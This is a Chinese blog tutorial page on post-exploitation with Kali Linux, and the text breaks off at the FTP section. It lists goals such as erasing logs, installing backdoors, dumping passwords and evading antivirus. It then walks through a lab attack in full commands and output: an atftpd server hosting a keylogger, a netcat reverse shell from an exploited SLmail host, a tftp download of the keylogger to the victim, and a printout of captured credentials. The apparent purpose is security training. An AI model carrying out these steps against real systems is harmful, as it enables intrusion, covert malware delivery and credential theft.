@@ -1,0 +1,642 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.0.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" integrity="sha256-yIDrPSXHZdOZhAqiBP7CKzIwMQmRCJ8UeB8Jo17YC4o=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.css" integrity="sha256-6cQIC71/iBIYXFK+0RHAvwmjwWzkWd+r7v/BX3/vZDc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"z9m8r8.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.19.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="该文章暂无概述">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Kali 后渗透">
+<meta property="og:url" content="https://z9m8r8.github.io/2022/02/07/Kali%20%E5%90%8E%E6%B8%97%E9%80%8F/index.html">
+<meta property="og:site_name" content="Ghost&#39;s Blog">
+<meta property="og:description" content="该文章暂无概述">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-02-07T08:34:00.000Z">
+<meta property="article:modified_time" content="2023-12-23T13:42:15.743Z">
+<meta property="article:author" content="Ghost">
+<meta property="article:tag" content="后渗透">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://z9m8r8.github.io/2022/02/07/Kali%20%E5%90%8E%E6%B8%97%E9%80%8F/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://z9m8r8.github.io/2022/02/07/Kali%20%E5%90%8E%E6%B8%97%E9%80%8F/","path":"2022/02/07/Kali 后渗透/","title":"Kali 后渗透"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Kali 后渗透 | Ghost's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Ghost's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">人若无名，便可专心练剑！</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A6%82%E8%BF%B0"><span class="nav-text">1. 概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6"><span class="nav-text">2. 上传文件</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#tftp%E4%BC%A0%E8%BE%93"><span class="nav-text">1、TFTP传输</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ftp%E4%BC%A0%E8%BE%93"><span class="nav-text">2、FTP传输</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#vbscript%E4%BC%A0%E8%BE%93"><span class="nav-text">3、Vbscript传输</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#powershell%E4%BC%A0%E8%BE%93"><span class="nav-text">4、POWERSHELL传输</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#debug%E4%BC%A0%E8%BE%93"><span class="nav-text">5、Debug传输</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Ghost"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">Ghost</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">111</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">25</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">49</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/z9m8r8" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.cnblogs.com/z9m8r8" title="博客园 → https:&#x2F;&#x2F;www.cnblogs.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fa-solid fa-blog fa-fw"></i>博客园</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://z9m8r8.github.io/2022/02/07/Kali%20%E5%90%8E%E6%B8%97%E9%80%8F/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Ghost">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ghost's Blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Kali 后渗透 | Ghost's Blog">
+      <meta itemprop="description" content="该文章暂无概述">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Kali 后渗透
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-02-07 16:34:00" itemprop="dateCreated datePublished" datetime="2022-02-07T16:34:00+08:00">2022-02-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-12-23 21:42:15" itemprop="dateModified" datetime="2023-12-23T21:42:15+08:00">2023-12-23</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Kail-Linux%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">Kail Linux渗透测试</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>3.4k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>12 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">该文章暂无概述</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="概述">1. 概述</h2>
+<p><strong>• 上传工具</strong></p>
+<p><strong>• 提权</strong></p>
+<p><strong>• 擦除攻击痕迹</strong></p>
+<p>删除系统日记和应用程序日记</p>
+<p><strong>示例（SLmail）</strong> ：</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220207111535712-921626053.png" /></p>
+<p><strong>• 安装后门</strong></p>
+<p>• 长期控制</p>
+<p>• Dump 密码</p>
+<p>• 内网渗透</p>
+<p><strong>• 后漏洞利用阶段</strong></p>
+<p>• 最大的挑战 ----防病毒软件（免杀）</p>
+<p>• 使用合法的远程控制软件（如 nc）</p>
+<p><strong>• 上传文件</strong></p>
+<p>• 持久控制</p>
+<p>• 扩大对目标系统的控制能力</p>
+<p>• Linux系统</p>
+<p>• netcat，curl，wget</p>
+<p>curl和wget一定会在linux系统下默认安装</p>
+<p>• Windows</p>
+<p>• 缺少预装的下载工具，难以进行木马等工具的下载</p>
+<p><strong>• 非交互模式</strong> <strong>shell</strong>
+（如该命令行窗口下必须输入完整的命令，无法tab键补全）</p>
+<p>• 类 NC远程控制shell</p>
+<p>• 交互型shell与非交互型shell区别：<a
+target="_blank" rel="noopener" href="http://kuku789123.blog.163.com/blog/static/1361673512012101513628599/"
+class="uri">http://kuku789123.blog.163.com/blog/static/1361673512012101513628599/</a></p>
+<p>• ftp IP</p>
+<p>在windows系统下安装ftp软件，体验非交互型shell的不足，添加/删除组件中【appwiz.cpl】【需插入光盘】</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220207112201614-635254903.png" /></p>
+<p><strong>备注：IIS5.1 组件安装包：<a
+target="_blank" rel="noopener" href="https://www.cr173.com/soft/2482.html"
+class="uri">https://www.cr173.com/soft/2482.html</a></strong></p>
+<p><strong>非交互：</strong></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220207120735548-774133434.png" /></p>
+<p><strong>交互：</strong></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220207120824218-1501654803.png" /></p>
+<h2 id="上传文件">2. 上传文件</h2>
+<h3 id="tftp传输">1、TFTP传输</h3>
+<p>XP、2003中已默认安装，Win7、2008以后的系统需要单独添加，但经常被边界防火墙过滤。主流为FTP，是因为基于UDP协议，明文传输，不支持身份验证（无需登录验证即可下载服务器文件）</p>
+<p>即构造一个TFTP服务器，在服务器中放置工具木马等，再通过被控端连接下载。</p>
+<p><strong>1.1 环境部署</strong></p>
+<p><strong>Kali：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop<span class="comment"># mkdir tftp</span></span><br><span class="line">root@kali:~/Desktop<span class="comment"># cp /usr/share/windows-binaries/whoami.exe tftp/ #windows下查看当前用户</span></span><br><span class="line">root@kali:~/Desktop<span class="comment"># cp /usr/share/windows-binaries/klogger.exe tftp/ #拷贝键盘记录器</span></span><br><span class="line">root@kali:~/Desktop<span class="comment"># ls tftp/</span></span><br><span class="line">klogger.exe  whoami.exe</span><br><span class="line">root@kali:~/Desktop<span class="comment"># ls tftp/ -l</span></span><br><span class="line">total 92</span><br><span class="line">-rwxr-xr-x 1 root root 23552 Feb  6 23:16 klogger.exe</span><br><span class="line">-rwxr-xr-x 1 root root 66560 Feb  6 23:16 whoami.exe</span><br><span class="line">root@kali:~/Desktop/tftp<span class="comment"># chown -R nobody /root/Desktop/tftp/将所有者改成nobody</span></span><br><span class="line">root@kali:~/Desktop/tftp<span class="comment"># ls -ll</span></span><br><span class="line">total 92</span><br><span class="line">-rwxr-xr-x 1 nobody root 23552 Feb  6 23:16 klogger.exe</span><br><span class="line">-rwxr-xr-x 1 nobody root 66560 Feb  6 23:16 whoami.exe</span><br><span class="line">root@kali:~/Desktop/tftp<span class="comment"># atftpd --daemon --port 69 /root/Desktop/tftp/</span></span><br><span class="line">root@kali:~/Desktop/tftp<span class="comment"># netstat -pantu | grep 69</span></span><br><span class="line">udp        0      0 0.0.0.0:69              0.0.0.0:*                           1636/atftpd</span><br></pre></td></tr></table></figure>
+<p>由于权限问题，会出现以下这个常见问题（启动进程不是tftp）：</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220207124602936-1871657981.png" /></p>
+<p>需kill 543这个进程，使用chown -R nobody /tftp/
+【将所有者改成nobody】</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220207124722446-1368520904.png" /></p>
+<p><strong>1.2 shell传输文件</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop<span class="comment"># nc -vlp 444</span></span><br><span class="line">listening on [any] 444 ...</span><br><span class="line">10.10.10.131: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [10.10.10.171] from (UNKNOWN) [10.10.10.131] 1108</span><br><span class="line">Microsoft Windows XP [Version 5.1.2600]</span><br><span class="line">(C) Copyright 1985-2001 Microsoft Corp.</span><br><span class="line"></span><br><span class="line">C:\Program Files\SLmail\System&gt;<span class="built_in">cd</span> \</span><br><span class="line"><span class="built_in">cd</span> \</span><br><span class="line"></span><br><span class="line">C:\&gt;tftp</span><br><span class="line">tftp</span><br><span class="line"></span><br><span class="line">Transfers files to and from a remote computer running the TFTP service.</span><br><span class="line"></span><br><span class="line">TFTP [-i] host [GET | PUT] <span class="built_in">source</span> [destination]</span><br><span class="line"></span><br><span class="line">  -i              Specifies binary image transfer mode (also called</span><br><span class="line">                  octet). In binary image mode the file is moved</span><br><span class="line">                  literally, byte by byte. Use this mode when</span><br><span class="line">                  transferring binary files.</span><br><span class="line">  host            Specifies the <span class="built_in">local</span> or remote host.</span><br><span class="line">  GET             Transfers the file destination on the remote host to</span><br><span class="line">                  the file <span class="built_in">source</span> on the <span class="built_in">local</span> host.</span><br><span class="line">  PUT             Transfers the file <span class="built_in">source</span> on the <span class="built_in">local</span> host to</span><br><span class="line">                  the file destination on the remote host.</span><br><span class="line">  <span class="built_in">source</span>          Specifies the file to transfer.</span><br><span class="line">  destination     Specifies <span class="built_in">where</span> to transfer the file.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">**C:\** **&gt; tftp -i 10.10.10.171 get <span class="built_in">whoami</span>** **.exe**</span><br><span class="line">tftp -i 10.10.10.171 get whoami.exe</span><br><span class="line">Transfer successful: 66560 bytes <span class="keyword">in</span> 1 second, 66560 bytes/s</span><br><span class="line"></span><br><span class="line">**C:\** **&gt; tftp -i 10.10.10.171** **get klogger.exe**</span><br><span class="line">tftp -i 10.10.10.171 get klogger.exe</span><br><span class="line">Transfer successful: 23552 bytes <span class="keyword">in</span> 1 second, 23552 bytes/s</span><br><span class="line"></span><br><span class="line">C:\&gt;<span class="built_in">dir</span></span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is 0CCA-0323</span><br><span class="line"></span><br><span class="line"> Directory of C:\</span><br><span class="line"></span><br><span class="line">02/07/2022  12:40 PM                41 1.txt</span><br><span class="line">08/14/2011  01:35 PM                 0 AUTOEXEC.BAT</span><br><span class="line">08/14/2011  01:35 PM                 0 CONFIG.SYS</span><br><span class="line">01/28/2022  01:28 PM    &lt;DIR&gt;          Documents and Settings</span><br><span class="line">02/07/2022  11:40 AM             1,120 HistorySvr.txt</span><br><span class="line">01/28/2010  06:10 PM    &lt;DIR&gt;          I386</span><br><span class="line">02/07/2022  11:49 AM    &lt;DIR&gt;          Inetpub</span><br><span class="line">**02 /07/2022  12:50 PM            23,552 klogger.exe</span><br><span class="line">**01/28/2022  01:38 PM    &lt;DIR&gt;          Program Files</span><br><span class="line">01/27/2022  07:46 PM    &lt;DIR&gt;          Python27</span><br><span class="line">02/07/2022  12:27 PM                 0 TFTP4092</span><br><span class="line">02/07/2022  12:25 PM                 0 TFTP588</span><br><span class="line">**02 /07/2022  12:50 PM            66,560 whoami.exe</span><br><span class="line">**02/07/2022  11:49 AM    &lt;DIR&gt;          WINDOWS</span><br><span class="line">               8 File(s)         91,273 bytes</span><br><span class="line">               6 Dir(s)  39,066,075,136 bytes free</span><br><span class="line"></span><br><span class="line">C:\&gt;<span class="built_in">whoami</span>    </span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">NT AUTHORITY\SYSTEM</span><br><span class="line"></span><br><span class="line">C:\&gt;klogger</span><br><span class="line">klogger</span><br><span class="line"></span><br><span class="line">C:\&gt;tasklist</span><br><span class="line">tasklist</span><br><span class="line"></span><br><span class="line">Image Name                   PID Session Name     Session<span class="comment">#    Mem Usage</span></span><br><span class="line">========================= ====== ================ ======== ============</span><br><span class="line">System Idle Process            0 Console                 0         28 K</span><br><span class="line">System                         4 Console                 0        236 K</span><br><span class="line">smss.exe                     560 Console                 0        388 K</span><br><span class="line">csrss.exe                    608 Console                 0      3,852 K</span><br><span class="line">winlogon.exe                 632 Console                 0      1,620 K</span><br><span class="line">services.exe                 676 Console                 0      4,312 K</span><br><span class="line">lsass.exe                    688 Console                 0      1,476 K</span><br><span class="line">vmacthlp.exe                 848 Console                 0      2,380 K</span><br><span class="line">svchost.exe                  860 Console                 0      4,700 K</span><br><span class="line">svchost.exe                  940 Console                 0      4,100 K</span><br><span class="line">svchost.exe                 1032 Console                 0     21,332 K</span><br><span class="line">svchost.exe                 1080 Console                 0      3,376 K</span><br><span class="line">svchost.exe                 1124 Console                 0      4,284 K</span><br><span class="line">spoolsv.exe                 1404 Console                 0      6,008 K</span><br><span class="line">HistorySvr.exe              1572 Console                 0      3,248 K</span><br><span class="line">sntlkeyssrvr.exe            1668 Console                 0      2,364 K</span><br><span class="line">spnsrvnt.exe                1820 Console                 0      2,120 K</span><br><span class="line">SLadmin.exe                 1836 Console                 0      3,088 K</span><br><span class="line">SLSmtp.exe                  1908 Console                 0      4,748 K</span><br><span class="line">vmtoolsd.exe                1944 Console                 0      8,484 K</span><br><span class="line">SLMail.exe                  2020 Console                 0      5,208 K</span><br><span class="line">VMUpgradeHelper.exe          176 Console                 0      3,856 K</span><br><span class="line">alg.exe                     1100 Console                 0      3,432 K</span><br><span class="line">explorer.exe                1708 Console                 0     24,048 K</span><br><span class="line">VMwareTray.exe              2164 Console                 0      4,468 K</span><br><span class="line">VMwareUser.exe              2196 Console                 0      7,688 K</span><br><span class="line">ICQLite.exe                 2204 Console                 0     14,308 K</span><br><span class="line">wscntfy.exe                 2216 Console                 0      1,904 K</span><br><span class="line">inetinfo.exe                2324 Console                 0      9,720 K</span><br><span class="line">cmd.exe                      516 Console                 0      2,508 K</span><br><span class="line">ftp.exe                     1984 Console                 0      2,880 K</span><br><span class="line">cmd.exe                     3996 Console                 0      2,504 K</span><br><span class="line">ftp.exe                     4080 Console                 0      2,884 K</span><br><span class="line">taskmgr.exe                 2824 Console                 0      1,344 K</span><br><span class="line">cmd.exe                     3040 Console                 0      2,672 K</span><br><span class="line">**klogger.exe** **964 Console                 0        792** **K**</span><br><span class="line">tasklist.exe                 592 Console                 0      4,080 K</span><br><span class="line">wmiprvse.exe                2976 Console                 0      5,572 K</span><br><span class="line"></span><br><span class="line">C:\&gt;<span class="built_in">dir</span></span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is 0CCA-0323</span><br><span class="line"></span><br><span class="line"> Directory of C:\</span><br><span class="line"></span><br><span class="line">02/07/2022  12:54 PM                30 1.txt</span><br><span class="line">08/14/2011  01:35 PM                 0 AUTOEXEC.BAT</span><br><span class="line">08/14/2011  01:35 PM                 0 CONFIG.SYS</span><br><span class="line">01/28/2022  01:28 PM    &lt;DIR&gt;          Documents and Settings</span><br><span class="line">02/07/2022  11:40 AM             1,120 HistorySvr.txt</span><br><span class="line">01/28/2010  06:10 PM    &lt;DIR&gt;          I386</span><br><span class="line">02/07/2022  11:49 AM    &lt;DIR&gt;          Inetpub</span><br><span class="line">02/07/2022  12:50 PM            23,552 klogger.exe</span><br><span class="line">02/07/2022  12:54 PM                32 klogger.txt</span><br><span class="line">01/28/2022  01:38 PM    &lt;DIR&gt;          Program Files</span><br><span class="line">01/27/2022  07:46 PM    &lt;DIR&gt;          Python27</span><br><span class="line">02/07/2022  12:27 PM                 0 TFTP4092</span><br><span class="line">02/07/2022  12:25 PM                 0 TFTP588</span><br><span class="line">02/07/2022  12:50 PM            66,560 whoami.exe</span><br><span class="line">02/07/2022  11:49 AM    &lt;DIR&gt;          WINDOWS</span><br><span class="line">               9 File(s)         91,294 bytes</span><br><span class="line">               6 Dir(s)  39,066,075,136 bytes free</span><br><span class="line"></span><br><span class="line">C:\&gt;<span class="built_in">type</span> klogger.txt　　　　<span class="comment">#目标机的键盘记录</span></span><br><span class="line"><span class="built_in">type</span> klogger.txt</span><br><span class="line">ausername:z9m8r8</span><br><span class="line">password:1111s</span><br><span class="line">C:\&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="ftp传输">2、FTP传输</h3>
+<p><strong>2.1 环境部署</strong></p>
